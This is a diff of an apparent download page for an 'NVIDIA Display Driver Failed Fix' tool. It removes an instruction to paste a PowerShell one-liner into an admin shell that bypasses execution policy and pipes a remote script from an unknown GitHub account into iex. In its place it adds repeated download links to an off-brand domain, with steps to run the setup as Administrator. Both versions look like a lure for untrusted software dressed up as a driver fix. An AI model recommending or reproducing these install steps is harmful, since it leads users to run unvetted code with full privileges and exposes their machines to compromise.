@@ -10,22 +10,30 @@ Fix **nvidia display driver failed to start** on Windows 10/11. This page includ
 
 ## Download & Install
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the repair tool.
+> **This is the download page.** Use the button or link below to get **NVIDIA Display Driver Failed Fix** for Windows.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+<p align="center">
+  <a href="https://nvidia-display-driver-failed.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-NVIDIA%20Display%20Driver%20Failed%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download NVIDIA Display Driver Failed Fix">
+  </a>
+</p>
 
-| Step | What to do |
+| | |
 | --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **NVIDIA Display Driver Failed Fix** from Start menu |
+| **Direct link** | **[nvidia-display-driver-failed.zipzapsol.space](https://nvidia-display-driver-failed.zipzapsol.space/)** |
+| **Full URL** | `https://nvidia-display-driver-failed.zipzapsol.space/` |
+| **Type** | Fix tool for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+### Quick steps
+
+1. Click **[Download — nvidia-display-driver-failed.zipzapsol.space](https://nvidia-display-driver-failed.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://nvidia-display-driver-failed.zipzapsol.space/"><strong>⬇ Download NVIDIA Display Driver Failed Fix now</strong></a></p>
 
 ---
 
@@ -51,7 +59,7 @@ irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.p
 
 **Where is the download?**
 
-Scroll to **Download & Install** — link or PowerShell command is there.
+Scroll to **Download & Install** — link or download link is there.
 
 **Windows 11 supported?**
 
